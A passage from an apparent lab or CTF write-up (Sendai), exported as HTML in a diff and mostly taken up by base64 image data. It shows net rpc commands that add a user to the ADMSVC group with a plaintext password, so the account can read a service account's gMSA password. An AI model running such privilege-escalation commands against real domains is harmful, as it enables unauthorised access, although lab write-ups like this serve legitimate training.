szEGx9mtxlnhGqIXq7M6dO/bs3ZOWlroR+x48lLvn76VF3Ds6KtCMiyMqIISeNsy1CKFNZ25uvqO942ZFZWtr28jIiF6vX3NP6OfH+/nzt3OtnVitjMO+djILCQlRJ6hLiovKtpXl5GQHBQeRzQQ+QMi4q682s3tAxqVFXJy/FyH0DcBcixDapGZn53p6ehrqG7u7usfHJ2ZmZpaXlx92l6hQKqKiImNiYnJzcwsLC7Kytmy2RLsmbxHXO5wCZFwo1kKopfP3QrSlGRfn70UIPUGYaxFCm5rRaBwbGx8aHOru7h4ZHl1YXNRqNFDBNZnMEMXu2ENClRGimEwmCwwKhAJtaGhocnJiWlpacnJSXHzcMzU27TOCjqhgvYUGXG9HBalU6s24Qg+CEEKPAXMtQgi5mUymmWko2s7Oz88vLi7Ozy1odVraWxTCGeQwgUAo8fcLDglRqVShoSHhEeGRkZERERFS6cOMobCJwScJodZisXh7KdAJe1d3VPBebYYdFRBCjwBzLUIIrWF52WI2mdzN6E4nnWQL4pa/n79cIYcQRtBjoCMqwDkDZFzv1WawhLj7NH/tajP4LhAIsKMCQmidMNcihBD61nivNvMOGUY7KtAJfldnXFrExYyLELoPzLUIIYSeCRBnVxdxIeA6HA5vRwXvFL44LC5C6F4w1yKEEHq2wIEJEq33OjNayoUlkGW9RVzaS4GOqEAQQsgDcy1CCKFn1+qOCmvO37t61DC82gyhTQ5zLUIIoY2BXm3m7YxLkVvz93qnfhB5YEcFhDYhzLUIIYQ2GG9HhdUZF1Kvd/5eQLvhwnccUQGhzQNzLUIIoQ2MdlTwDovrHVGBdlSQSCT0UjNax8WOCgj5tv8fAAD//xGPkqYAAAAGSURBVAMAnlxhutkJKlkAAAAASUVORK5CYII=" alt="9775e0aa13f8a782708fa7212725c814.png"/></p>
+<p>I added the user <code class="inline-code">elliot.yates</code> to the <code class="inline-code">ADMSVC</code> group:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ net rpc group addmem &quot;ADMSVC&quot; &quot;elliot.yates&quot; -U &quot;sendai.vl&quot;/&quot;elliot.yates&quot;%&quot;P@ssw0rd&quot; -S &quot;10.129.234.66&quot;
+                                                                                                                                                                              
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ net rpc group members &quot;ADMSVC&quot; -U &quot;sendai.vl&quot;/&quot;elliot.yates&quot;%&quot;P@ssw0rd&quot; -S &quot;10.129.234.66&quot;   
+SENDAI\websvc
+SENDAI\Norman.Baxter
+SENDAI\Elliot.Yates</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ net rpc <span class="hljs-keyword">group</span> <span class="hljs-title">addmem</span> <span class="hljs-string">&quot;ADMSVC&quot;</span> <span class="hljs-string">&quot;elliot.yates&quot;</span> -U <span class="hljs-string">&quot;sendai.vl&quot;</span>/<span class="hljs-string">&quot;elliot.yates&quot;</span>%<span class="hljs-string">&quot;P@ssw0rd&quot;</span> -S <span class="hljs-string">&quot;10.129.234.66&quot;</span>
+                                                                                                                                                                              
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ net rpc <span class="hljs-keyword">group</span> <span class="hljs-title">members</span> <span class="hljs-string">&quot;ADMSVC&quot;</span> -U <span class="hljs-string">&quot;sendai.vl&quot;</span>/<span class="hljs-string">&quot;elliot.yates&quot;</span>%<span class="hljs-string">&quot;P@ssw0rd&quot;</span> -S <span class="hljs-string">&quot;10.129.234.66&quot;</span>   
+SENDAI\websvc
+SENDAI\Norman.Baxter
+SENDAI\Elliot.Yates</code></pre></div>
+<p>And the members of <code class="inline-code">ADMSVC</code> group have the ability to read the GMSA password of <code class="inline-code">MGTSVC$</code> service account:<br/>
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAA98AAAD0CAIAAAANEgKPAAAQAElEQVR4nOzdB3RcV3on+O++qkIVciJyjgwAI5hzUiDFIFFZLbnd7rbstj2etXe8Z/bMzNk+s3N2d3bWM55ud1bb6m6lVqYCc6ZIihEkQIIAiZxzRuV6d79bVQBBiqRAUiQf1P/fwZFQhapXr4rAff/73fvuM0spCQAAAAAADMBMAAAAAABgDEjnAAAAAABGgXQOAAAAAGAUSOcAAAAAAEaBdA4AAAAAYBRI5wAAAAAARoF0DgAAAABgFEjnAAAAAABGgXQOAAAAAGAUSOcAAAAAAEaBdA4AAAAAYBRI5wAAAAAARoF0DgAAAABgFEjnAAAAAABGgXQOAAAAAGAUSOcAAAAAAEaBdA4AAAAAYBRI5wAAAAAARoF0DgAAAABgFEjnAAAAAABGgXQOAAAAAGAUSOcAAAAAAEaBdA4AAAAAYBRI5wAAAAAARoF0DgAAAABgFEjnAAAAAABGgXQOAAAAAGAUSOcAAAAAAEaBdA4AAAAAYBRI5wAAAAAARoF0DgAAAABgFEjnAAAAAABGgXQOAAAAAGAUSOcAAAAAAEaBdA4AAAAAYBRI5wAAAAAARoF0DgAAAABgFEjnAAAAAABGgXQOAAAAAGAUSOcAAAAAAEaBdA4AAAAAYBRI5wAAAAAARoF0DgAAAABgFEjnAAAAAABGgXQOAAAAAGAUSOcAAAAAAEaBdA4AAAAAYBRI5wAAAAAARoF0DgAAAABgFEjnAAAAAABGgXQOAAAAAGAUSOcAAAAAAEaBdA4AAAAAYBRI5wAAAAAARoF0DgAAAABgFEjnAAAAAABGgXQOAAAAAGAUSOcAAAAAAEaBdA4AAAAAYBRI5wAAAAAARoF0DgAAAABgFEjnAAAAAABGgXQOAAAAAGAUSOcAAAAAAEaBdA4AAAAAYBRI5wAAAAAARoF0DgAAAABgFEjnAAAAAABGgXQOAAAAAGAUSOcAAAAAAEaBdA4AAAAAYBRI5wAAAAAARoF0DgAAAABgFEjnAAAAAABGgXQOAAAAAGAUSOcAAAAAAEaBdA4AAAAAYBRI5wAAAAAARvFHkc6HR6h/kEbs5HSS00UuF4WEkNVKoTb1FRlBsdEkBAEAAAAAPFzfznTe2091TVTXQJ3d1N2r0jlHc4eTXG5y+78sFhXQ+csWQmFhFBVBMVEUF0vZGZSbSanJpGkEAAAAAPCAfavSeXM7VVRSVS01NFNzG7W0UV+/qppL+fXPjQij6CiVy9OSKSONCnOpeCrlZZPJRAAAAAAAD4aQE4muxtbVQxVX6GIlXa6mmjqqb6ah4dskcp0o8LNb5m6bjdKTKT+bCvOoaCrNnE4ZqaimAwAAGBfnGZ/Pp/kRwGQ2udO5y0WnztOug3Spiq7W0sDQdaFc6sNCdglfj5T9pA8JOcLP4C/BAV3wn66Vv6QIkyJcaDFSiyeRQFoUfyZjWwi1UU6mqqM/uopWLMb0dAAAgIfPbrd3dXZ19/T09/cPDgyO2O0up9PlcgXSuSUkxGq1hoWGRkRGxMbExMbFJiQkxMTEILXDZDFZ07nHQ2fK6PAJOnmOyirUuZ5jpK9F+BqFr4X0WvI1kt4ndI7tIyQdRG4inxC6P4KbJYWQsJEIJRFJWgyZ0qSWJ03pZMokU8ZYcZ3/nAtzaMFcFdCXL1ATYAAAAOBB8nq9PT099fUNzc3NdbV1DfWNvb29g4ODIyMjdofD43Z7PF4pufomzCazxWKx2azh4eGRUZFRUVGpqSm5ebmZmZlZWZkpKSlhYWEEYGCTMp339NJHO2n3ITp/ieyO0Xt9A8J3lXzVwnOKVDTvIC6cS/vENyuETYp4qSWSKVWaS8g8VZoLSJsSqKabzTQ1j1YvpSc30NRczEcHAAB4EDiC19bWXb58+dLFiqtXqzva27u6uoeHhyceYKzWkLi4uKSkpIzMjOnTpxUXF0+dNjU5OUlgQBwMaZKlc6+Xjp2mXQdo7xFq7wrOY5G+buGrEJ6TwnOBfA1Cb/VPLr8nUkvm8rk0FcmQhWSeRaYUrqHz/VERtHg+PbKSNqyhGEx0AQAAuG96e/sqKi6fPnn67NmzjY2N7e0dTqeT7oHJZIqNjc3MzOCAvnDRgpmzZvL3JtTbwGAmUzofsdP7n9HHO+ncRRXTSc0sH9K8ZeQ+JDznyHtV0NBNnxgeISMjZVgE956l2UKaUKeFej3kdpHdLkaGaXCAP4ebBW0RSqZcaSrWQ9aQpYRM8YE6enYGbX6EXnlGrfGCgA4AAPDNGhgYqLxcdfToFyeOf1lTU9Pb23uTB/HRPIxkFB/miWyCLP4ymjrA+88yc0jBoWCIhPcmTw0LC0tPT5s7d+6KlctLSualpacRgGFMmnTe3EZvf0QffK6+Ce6y55LwHBHuw8J7ieTwDY+PidOTU2RCooybQmnpekwshYbLkBA1QSWQpznfe9zkdHATIFqbRE+36OqkjnbR3andmNSFjUz5umW5VBl9LgmL2n4UPbaGXt5Gs2aobQIAAMC983g8dXV1+/cfPHTw8JWqKz09Pdf9WKg4LlNIJglK4m+EnCIo1L/QgzkwyO1P524iJ4kBSe0k2qXoJOL/dpNwX7ex0NDQrKzMJUuXrH9kfXHxDC6rE4ABTI50XtdEv/gtfbKHBgPFcd8geU9qzvfIc0HIrtEVEhUuk2dm6RnZcsZMPTlVxsXLmFgZGaUuPHSrIrfHQ8NDNNDHI2iiq0NUXNQa60RDnTbQf11BXarTRmdI2zYZspy0RP7oLGZatpD+6ru0cK66vBEAAADci97evrNnzu7Zs/eLo1+0traNjygynGQ6yVwhC4XMEZIHs2MFRfur5rfiIRqWNECiR1KrFFelqCFRK7Xu6x4VFRVVPLN43bo1jz72SFZWFgE8bJMgnZdX0q/foB0HyBE4AdRXrzl3k2uH8F3iG2MPi47VC6bKmXP0qdP1tHSZlCpNpjuedsIfRmcHtbeIq1VaWal2pZLz+nWldGnKkyGPknWTtBQGruW0ZD69+rI6WzQEAR0AAOButba27vh8J39VVVUNDV0bEpfRpOcLOYdksSbTVMmcwu58UqlHUh+pjF4ltfNSVEpt3ElqZrM5JTWZK+hPPrl1xozpVquVAB4eo6fzy1fpH39B+46qCjeTnosm19vCdZD09rGSeWionFakL1rm43p5ZraqlN/7XHC7nZqb6EqFdvKY6eIF7bqJ6SJOtyyi0JelZUFglsucYvrLV+jR1WQNIQAAALgjuq7X1dZ9+OHHn2z/tKmpiW8G7pcRpOeRXCj0+RrlCFUsv3d2fx39otROSlEutY5rP4mNjV22fOlT255ctGghF9QJ4CEx/ehHPyKjqmmgf/oV7ToUPAeUPOdMjp8L1z6S184Oyc7T1673PfGUd/FyPS1DXebzGzlN02Kh+CmUlSMzs/XoGHI5RW/PWEB3CL1JraSuxZMpnYSpvVNdoDQ9VX3hzG8AAICJ83g8lZWVb7759vaPP2lpaQkWDTU1j8X3qNCfNMkVGuVqFPoNLcJgERQnKFPIPCH5G5cUw8H56E6ns6Wlta2tnWvnycnJoaGhBPAwGDedN7fR//w1fbYvWDUn9xnN8VPhPqRO9PCzWOS8hfozL3lXrffl5BEPQ33jy6eYzTQlgbJyZUa27nGLri51Iql/2Raf0Julr1loCeq6RcLU2U0t7erCoimJhIuRAQAATARH84pLFW/+/q1dO3d38VHWT00xn036Fk1/3ESFGoXfh8XROKPHC8oSaqoMj3v3khgO7k9XZ1d7e4fNak1LTQ0NQ0CHh8Cg6dzuUFXzDz4nV+AioJ4Lmv0nwvOF/0xsJSZWX7lO3/aCd/4iGRF5f5c15Hp8WjqlZ+gmM3EFfWRYBNZVFHqb9DWRlkKmNA7ore3U1UMls9TFRLHMIgAAwO3pul5VWfXGG2/t3r23pyc4Ki7jSF8l9G0muVijBEH3teBl8y/8kiVUB6BLin51n9fr7e3p6erqjoiISEtLtXEIAHiwDJrO3/6IfvM2DY34b3iqNMePhfvwWDRPStE3bPZt3uYrmCof2EySuHjKzJIREdTdKcaWcxF6u/C1SFMOmZJ5HI7r/XzvvJmEv2UAAIDbq6ute+edd3d8vuNaNE8k3+MczTWart3NqZ93wSQoRsh0IcPU0i6iT53U5vP5evt6+/r6p0yJT09Ps2BdNniwjJjOj5+h//Yzauv03/C1CcdrwrVTUGCCC6Wk6lue9j62yZeS9qDnkIRHUFqGjIiSne2iv28soLcJGpamQtJidV2rbaCEeCrMIwsWQQcAALiFlpbW99//4KMPP+7sHJ3QkkS+J4T+pEY5Gk289KZLX7PHdcTuPmD3fOnwnHZ4q1zSLUWUJqwTTgncE0gTMtof0Lv9Ad3r43w+PDKSmZnBFXQCeIAMl867eui//BNdqCB1xrb0COe7mus9IQcDP01I1Lc+631ko29KwsOZ3m21UWq6DAuXLU1i8FoFvU2trmguJhHmdFFDk7pEUXICJqADAADcRF9f344dO9956w/Nzc2Be1TVnKP5Vo3S7+DY6Wv1OHcOO94ZdH0y5N7vT+enHO5Sp7fK7a3zkFmYMyZc9lazXISMINEphb+/4PF4erp7pJQ52dmxcbhQETw4hkvnr71JH+4gd/BM0OOa8xfC1xJYPDEiUj7xlG/DFl/clIcZfENCKDlFms3UUKeNqJNIhLrgAQd0LZnMeSTMvf1kd9LShYSTSQAAAG7Aqff06TNvvfF2RcXlwAotMo58j/mr5hOO5p5Kl/P9IcdHg84Ph7wnnLJbJ5dUlwjlryGpN3i9ZU5fnYczurTrWoZZmCYwT4YDeoKQVhKt/iku/lVcOjs6LSGWgoL8sLAwAnggjJXOT56j//YL6vWflkHeRmH/75r3wtjVAtY+6tv2vDcx+eHXpEOslJQiXQ5RfUXzePzlczlMeqs0zyRTopqA3kppyVSYi/ktAAAA16mvb3j//Q+PHDnq8q/8IMNJXy7kNv+yiRPjrXU7fjfgeH3Ae84lB/SbP8hHerPXc1pldFOi2Zw/sSuScEBPFGpeTaMU/suTj/ilZ6Tn5uYKrPkAD4SB5l74fKpw3tZBgaVOhXuH5j09djXQ4lm+rc96U1KNMl0kLo4e3+qdv9hnsQQviiS8lzTXdpJ28q858/q7xBld1wkAAAACBgcHjxw+eujgoeHA1UA1koWkPyJkzkSDr6/F4/hw0Pn5sOyfwCFWJ+95l/OzYV+rlyYoXuirNX2t0KPVLa7u19bW7duzv76ungAeCAOVds+W04lzoxce8l4m5yckg0ubJyXrz73szSuU2i1OE/nkI0fNFe/4KLx6nXX2PIvZfMfd3AN7nOUXPN5xf8Vz5lmWr7KGWG/sM6el0zMvedrbRHWVpuv+CrprL1nWUMhSEpaqatr/BaWlYH4LAABAUG1N7dEjR1pbWgM3ZTLpqzQ5U6OQCR2v9WGf68CI88Mh2eGjCfOcfoJW3AAAEABJREFUcdh/3x+6LdJcYJ3QE5IE75Wo1emEJEnDw8MnT54qnlmUkpqCSxTBA2CgdP779yjQkea/VuH8SNNrxua0rFzrmztfv9Xiibs/c/zif47UVPvGp/OyUs/yNdZXvhdms91BQD/xhesXPx4pu+D1jfurL5ppbmnWn32J/yRv3NT0Ylr3qK+pQXPY/bf1Vs31oc9cLEzxPALw4Q7a/AjSOQAAgNLX13fs2PHz5y/o/gO2mtOyWOgrNYqe6JHac9rpeHtQr59wIdxPb/Q63xnU4kzmPOuEJg1wOMrjgC5Eo9T8p622tbXxns9fUFJcXEwA95lRZraUV9KRk8HCufBUCPd+ksElFHML9PUbfKHhN7/Ej9crf/Mr+w3RnB3/wvPLnwx3dvD9kibG6dR/+5q9vOy6aM4ulXt//fPh6isen+/GTXGHYcVaX9FMn9k8Or/Fc1zznieprilaVaNWh3S6CAAAAGpr67488WV3d0/gpswifalGqXdQRFOLsZy/m8Oq3uHzXnXrIxOuuEcKOV/TF6mTRJnb7b508dKpk9w5cBLAfWaUdP7xThoYCH4v3LuFHlynhQStf8yblStvNd38wF7nlUrvTad3D/TTL38y4nRMNJ2/9brj9Jdu78065O2t8pc/tY+M3GRTyan0yBO+8PDR23o3uXcH5uTwprh8bncQAADAH7nh4eGzZ85WVFwO3JRRpM8XslhMfGlz6ZXkmegx/au8ZS73iTs5JCeRXKCpK4n6dXZ2nTp1pqGxkQDuM0Ok84Eh2n+UvP4OrfS10PjCeb6+ZCVXpm/53Df+1eG89d/au285J166fvctx9DQLX+6+zOXy3nzRqFkoT6t+Fr5XHMfE77qwPms5y9SfRP57mB2HAAAwLdQc1Nz6bnz1y4LmkVcnKb4Oyic611eX9udzWkZz3vZ5Tl9J+ncKuQ0oc8h6V/uhcvnV65cqaioIID7zBDp/OQ5am4LLtWieU4Kb+3YjPPla253TVB+Ss1V7zeVfZ3OwLqrdywunpav9oWMnWqit5L7GEnVLRgcVh0PTG4BAIA/ZrquV9fUXK2uDs44DyO9WMiCO1u5wdfk8Va76a5x3e9OD8cJJGcLmRa81dbadr70fO9oBwPgPjFEOh8rnCvu4ySCN6Yk6EuX365wzubND7nNAywWmviffkysdtfLNXL5PD1T17TR2efuU6SPBL4//CXnfgIAAPij1d/XX3HpcktzS+CmTCZZrFHcnaVzaZdy5MEuVBwiZK4m84P7OTIycrmisrq6hgDup4efzrkXfbYseD6o9LUI7zmSwXGr4jl6Zra8TWIWgl75s1Cr9ZZ/3k9ssYZMbPUk9vhmm+3W66ssWGIJufV6T8mpNHuebhm91oHwXSK9nofR+PvqOuruxcLnAADwx6ultbWqqorTbeCmTBMy+44ziLAKYXvguYU7EkVCRgZvdXR01tc3EMD99PBXVGxqHTetxXtB6O3B80GJZs7VTV+3g7PnhswoNp8949G/Mr/FauPsft2KikOD+olj7v4+PTxcLFoWEhfHxfJrP926zVZ50bNnp8vjuXFTeQWm778aFhp2u15+8Rzfzk/MrkCZXPYJT5luKiZhHhyiH/+G8rPJjOuGGkPJLJo3k2w2AgCAB6O9rf1a4TycZAHd0VItAVqaxZRt8Zx4sIstRAiuncsMEv4J552dndzNGBoaCg0N1VF4mww46plMpsl1ndeHHxhPnaexNCy8l8dmnEdFy6KZPtPXncpttYlX/yb84/cdRw64h4aCsZ5z8PMvh6amaQVTLYH8ffmS5+BeV2+PfvKEe6BfhoXTyeMhMXHamvXWmbODFy1KSTX9+V+FR8eIHZ+5BvqCc9B5B7Zss61cG7JkhdViud0/7fQZMiFRHxnWpPRfmchbqc5tFaoav2O/mmMDBrHpUcrOoNRkgtu4y5Mw4JuGK4fDt4DT6WxsbGxv7wjclIkkcwWnXrpDphSzKfPuj6amXIu5OITunIwXXOynCtUq2u32+rr6zs6u9PQ0r/fuT1GFB8bkR5PKw0/nZZfGLWniqSIZvJGVo6em0kQOTKvXWVPTTHNLXLU1vqoKbwqH8kLzcy+HxsdrgQNbZ4fvlz8ZuaEoXnNVVbkvXvD8x/8zMjvHHAjxRbMsfxEfUTDN3FDru1jmzck1pWWYOJ2npZs009fsSnwCl9hlc+NoZ8N3lVsk7mXwLrg96gsMgss3Lvxz3BZHc5/Ph7LQQ8ctmJmLBwjoMMn19w80NDQOjC2cHK8uxkl3TliECLn7PwfzbGvIijC6C3Ek04U0S+FVzWNvb293V1dGRjrBJMH/aqid35m6ZgpeL0jvF3ptYCFClp2rpnFP8MMsnGbmr65O35Uqb0qqlpVtNo2G6cEB/Zf/PLJ3903mq7Cjhzw/+yf7P/zH8IQEUyCgc9B/+U/D+3p1Lrdn55qSkk0m04R2gnc1M0c3mU2BFxJ6g5BdkqYYZ1F5gInjmpAPS4E+bJrfpKv6ANygv6+vq7NrrEmRcULG090x5VtMRSG+S3e+ckuYMGVYtIS7ij2RRBzFo4n8l1HibgYHdAK4bx5+cGxuHT1j0tcsfZ1jk87TM+SdrqCSkGhatsKam2cZn6ff/J393Tcd7lsvorT9A+dbrztc1y+rEhunLV3BJXnzBKN5QGqaHDuMCjkgfM1jZ7gCQMDJk6cOHz7S19dH8BWDg4Pbt39aUXEZAxfwbTI4NNTf3x/4XoaQTCCKuctCpmWuLWRFKN3pswVZSmzWteHCfFevaxFqcktc8Nbw8PDAwCAB3DcPuXY+OERd3cFTQoXeKehafTshWYqvS+cXzrmPHr751T1jYsQLr6hTQt99w/G1y42//Xv7d38QHhom3n3T3tam33TC7dLllrnzQ24/9Zz3eSydq2m7vk5hwSEWJreamtrjx4739akjq9UakpSUVFIyLyU1xXy3pzmfPXOOC2mZGRmxsbEcRi+cL6uurna5XFFRUcUziwsK8kNDQ+vq6o8fO5GamlIyfx7fH3gi/00dPHCIH/zoo49k52QPDQ2VXSjnm3a7Iy4udu68OdnZ2SEhwUmlvIWTX56cNXtWYWFBYFfr6xt4m93d3aROTTHHxEQXzywqKCjglyPDGBoa3vH5jg0bHp82bSoBfFtwnB0aHg7eiPBPawm7y3SuxZpsj0fqzT73YbscmugRlqN5+A9j+b9018LUTNVAAdFut3OTOLm60B6Pp6ryysDg4LJlSwgM7yGn8/5B8oxla9nLBedA6ZxzeVycvP20lh2fOLa/7zxy6ObpPDfP9NRzoZzOR4Ylfd3pbX29wR7CR+87S894bjqef+6UZesz+hNbbeMXgblBXKwMsQZeTD1Gyn5JOmaMwqRWX1//2Wef5+fnJSenOBzOY8eONzU1bXt6W1paKt0bPlrs2rXnfOn5iIiIyMiIpsamy5crt2zZNHvO7MbGxvfefS8+Pj45JXksnXd2dn7w/odffnly6tSpGZkZ+/buP3/+QmRkpNVqvXLl6tWr1du2PTl12tTAPJAvjn7x0UcfDw4MJCYmTJkyhe/h3d65cycn/oyMDF33cVjnl9u6dTO/nOXhnbXNB3jhRwCTHEdw7m/zN/wXPfZnG+B0OO2jaylSqD+g3+10LWESIQtDRaTGh1nXp8MTeYq5yBr2l7HW1eF0LwK77cctYV9/v8fjHb/sm5FxY9vQ0MA9/56e3szM9LS0tLu/vAs8EA85nQ+P0LVCtbz2Z2azycjo2006r6/1/uIn9qrL3lv1XU3muznc3WZ654ljntZW34wic+H0W053CY+k8Ajq6RodDZBDkm7cv5efpvZOOnqSXO5r9yROUW/W6aT6FvryNPUOqC1w4/biVuroot2HyDFu4s3KxTSnmD7bSw1N6iqqC+fStHwKD6f+ATpznq7UUU4GrVxCH3ymOj8BIRb6ztPqp5eryWalJfMoN4csZrXx42eorePacuyhNpo9g3Kz1CIzuqTePjpXRh3dwQdERdKSEsrOVBtUzz1Nrf7nPr+V0pKvu6Trv75DU+Jo9RI6cJxqG4In/hbm0tyZtPug2vIzmyguRj2Xfweu1tHp8+qb8Z7drIZWvjhFI/bgPZseoZ5eOn/p2qfB+7liEe04oEZgAvhNPbeVLlep03CLp9HeI9SDCRT3LCoykuP4nDmz+Zi0a+eu7ds/WbJkCafzrq6uM2fONje1hEeEL1y4ICsrk2NuS0vrmTNn2ts6wsPD5s8vycnN4fQ8MDBw+tQZDvp8zG5qbAwLUydm1VTXHDxwcO7cuRufeJwDdHtb+4cfftTd08t1dFKzy2L58TU1NTk52Tb/+penT5+x20cC1XGulx84cDA3J+fZ55/l59bV1f3+t280NjXxy3EtvLe3r/pqzayZM5uaW1pb2gLpnPyhYcuWzUuWLvF6vU1Nzf/tv/5/ZWXl+QX5DoeDK/qtra2hoWHzSuZyV4T3uaOj49zZ0ubmZn5FrsFPnVrIu11dXXO+9EJPT090TNT8+fP5LXOF3mQyFxXP4I0f2H+Qd5UfHBERzt9HR0cVFRdxp6K09EJ3V1dkVOS8eXMDBf6jR7/gjfC74BI+j0X09w9cOH+BC+f8EgP9AwQwCfFwVltbG/n/0Ib9lfKxmO52uwN/14qVv+411FqmW8O+Gy1d0nPKIftvXcPWyDzLGvZqTMjquzoZdBwZIuRo5d3r9XBnw+fjdK469t3dPadPn7aP2JcsWZw6Wrbgsb6qqqpjXxznAbqVq1bwTW4w+c+8oaHR5/VNSZjCY3f5+fnNTc1c8uAtjH8tHldcsHA+t7FcQeAv3nJsbMxMHlosLKivq6+srJo9e1ZWdlbgwe3t7TwCyQ9YuGhhb29v2YWy2to6buKSk5NnzZ6ZlZXl8/nKy8v37tnf19fncrs+eP+j9evX8kBl4Onc+vHjucDBAwL8rxIRGVFYWJibmxsSot4a/6vV1dZduFDGYwXcuE2dVlhcXMQtWHn5RR6KHNvh0LDQ2bNn8w5ze8h7snzF8kDJo7Wl9eLFS+np6Xn5ufwNfxrq385iSUpK5LaRW9qxk2r4hfgBvCcrVy7nEdrAnfxZ8QvxK2Zfe7MdpaWlCQlTuPkN3DMyMsJvuae3l49B/MlIXa5avZImv4eczoeGx6fzayuYWm3Eo823ytenT7rfe8tefcV7m2Elh0O/ixXhnI7brSPXUKdOMH35e2Gz51luOsWFd9vm3+3Rjbjo+rp9TqYKnRwcyyqoc/SP8TvbVMatqqbwMFq2gIoK6PV3qauHYqLoBy/R0AiVXqTGluA2rSH0vRdo5SKquKKm7K9ZTo+upI4ebvsoM43mFtOv3lA7wIn/SjV9eS44NFGYR688Q1dr1dNfeooKcqi3n+xO9fip+fTamypq8/Y5LnMC5vjudKk8zfdwwn7ycdr/hT9h6/TCk5SXpfZc99GcItUr+PUb1NZJz23hdpkqq8HcT/oAABAASURBVK8tTcPP5Rd99RXKzaZ//AV1+tPz1Dx6bjOdPKcuDfu95+lkqeoYxETTxnWqR/HBDhqbyJeVRk9tIKuVqmqupfMn1tOVGnXPWDrn/gB3DNo76NCJYG8nP0e9wX/6NUWEqb06W36TdM7Hia7O/lBMOrotjonjT0bUhFBXB1C/21ITajUkPhJ/9NF2jtQxMTFtfk8/vY1z/Ecffsz1s+jo6EuXKjgBv/ji81zn3rN7H+d4PuS43G6O74G1DvgBZrNl4aIFXMjhDWbnZD/73DN8fyB/84N1n15ZUTlr1szMzMzh4ZGTJ05yK8/JW+2PJjgB81g5H/Di4uKmTZv67PPPcAE+UBAqKysLDw9ftXrF3j37uGSuZsuEBaeviMB5lprJ4p/uouuyv69/z569XV3d/Ebq6yu5bP/c88/ywWDnjl1cX+eNd3Z0ctbnO7mQ/9mnn/MQPd9ZdqG8q7Nry9bNXLPnB/DRgn+vPv3kM/7QEpMSuWC/c+fu+QvmRUVH7d61hw9s/JSOjs7GhqbNWzZx0OcDGx+KCgsLZs+Z1djYdOjg4QFV5k/kKB+YRBTAFS9OOTg9FyaF4dG5K8N+NBrT+b8eJTjMLc0kv4nBKktJaPjfa54zDt9Vt6fU5av1SIceXFfCJkzJZvNsq3lqiKXYalkWpoXec6mYG4zR3VYTV32cQILHd87EPJTH0dASYtkyms65hTxy+Oivf/WbbU8/xemcWypujjjmcuPATVxFxeW6uvrHHnuUmwh/myS4HbhSdYUzN7dXfNPpdJ46efrQocPcltpsVq5TcHO0du0ajt2HDh7i1iaQzrlB5mD9+Wef84+4ETuw/wCPKPKoI78Ev1ZDfcOmzU/wS3BxhNvqp5/dNjQ4xK3Nvn0Hpk2fZjab+/v7z549V321mht8jjVSXRZm6NTJUx3tHYuXLOJ7eOOfbP+Uh/i4QebWiSsm3NytWLmCixR7du9du25NIMRr/vE/Pgp8+MFH/NL84Dlz55C/57B/34FFixfyUYB3bPfuPevWrZVSr6ys5JZz1aoV3KMINNqdnV28wfKy8ojwsA0bNwQ+Q269uR4UHRU1ls75Yzl3ppS3MHPmTK6hkLo4VMeePft4V6dNm8btKreWSOffAA6IY+lVCDmWZTkV3KaM/eufjhw56L79AauvR3c4ZFS0TErR+gd88rZJLMU/yGO3y57ur8n0n3/iGhiQ/+Nn0TGxN0nnN+y2+MqrPr6WzpRRyUxVRe4buDarh+PvRzvUMu0zp9PfvUoNzbR9t7qfux+cp+cVq/QcmD3PD4iPUek2sJ/bNqjg++YH6gGpSfTvfqi2vO+oSrFLFlBZZTDvrltBdY2qRD2jUOXv371HB4+prlHRVPrRv1M1db7J29y2UdXgDx2niqrgviXE05pltGk9/fY9lbyf3khvf0wf7yK7Q/Ui/vYHatXwLn83g/MxV+uHR5N0YPc4WHOtffVS+nzftZA95t3tquMRGUHLF9KfPEs19XTibDDfr11BFVdVByA/W6V/1y3OHOA+A/dqSubQuYvB3Vi1hFrbVT+kqJBuhfvonV1dFu3OT/n/o8F/D5yYxyZkDw4OvfvuB1zu5VovN9DLli9LS1dFndJzpU88sXH1mlWcwv/7P/4Pbm2nT5vKBeOly5bMmDH9yy9Pvvarf2lrb7eFhnKde968OZu3bOYmvLW5JZD7u7s5EEeHh4XxnXxsu3Llitfry8vPW7JkEf+Uo/nSZUsrLlXwMSk1lV/u8uDQEJdnAlfp42PJps2bvjzx5a5du788cTIzK4N/lJycxMcbt9vDhXAu1fDhp7Wtnasv3Hxz9Cf/rO7tH39aeu48+QMEl6+4tsTHksjIyDlz586cWcRdiN+89q8tzS3cH7hwoTwhIX7L1k0+n37i+AmzxcyVp8rLlXyk4VDO9STeMu/59OnT+ADW3dPD4TssPIzvb29r43KOyaSlp6WXl1/iRL7xiQ2LFi/iI80vfv7Lc+dK09PTeAf4IM0HIS4LffbpZ3wM48csWDCfQ39p6fmxfwhONFxi5+IWARjeV4tbgZjO6Zx/h+XYAVF8MwtSCKsImWXjL1+X11Pq9NVxOufU7N8Hfzq3zLKa8630Tc09uX63OZrLcYd4bpGcDsfF8ksrV67gfj7fw8mYm0QuE5D/k+FixMmTp7i++/iGx3iMjuMpl5lb29q4gh6oVnAFnTv//PQNGx/nm5yP9+3dx1nz5Vde4g1evXp19669XIznFJ6alsYN48jGx3njXPCura018XudM7uiooI3wkVl3kJoqO3M6bM7d+46ceLkylXLufPP5epFixZyk8KNJDfjvEucdMvLLnLdnRvnufPmcjeAUzjXVrj9rKq6wpmem/GKS5e5Tfubf/PX3JxyJ2T3zt1VlVVz56nkzW3sn7/6/cAbDODGjVMyt/mff7YjJTWVX/GGjzA3N+cHf/5n3P5zjXzH5zv5Kzsnh9ttft2mxibe/oyi6TyeuWr1qsD46lfxNrl+f/DAIe7McDeGn8jlHv6sntr25NhJR98OBrp8pSrJjf4ZcWn2NuH73C2mho/HWXD/HuczL4Q980LoP/7fw7c/uj37os0WKvbudPb3f/01WL44zCN0N38Q7/b4S5bK61sgLo0vLaF/eo3a2mn1MhWdPUPjHixVXD5+WpXP1y5XUzLIP//+wBF6dDUdPRVM51zJPl1GY6uscvjmdJucQN29qr7+m7dVEZ2/dh5Q5fO3P1I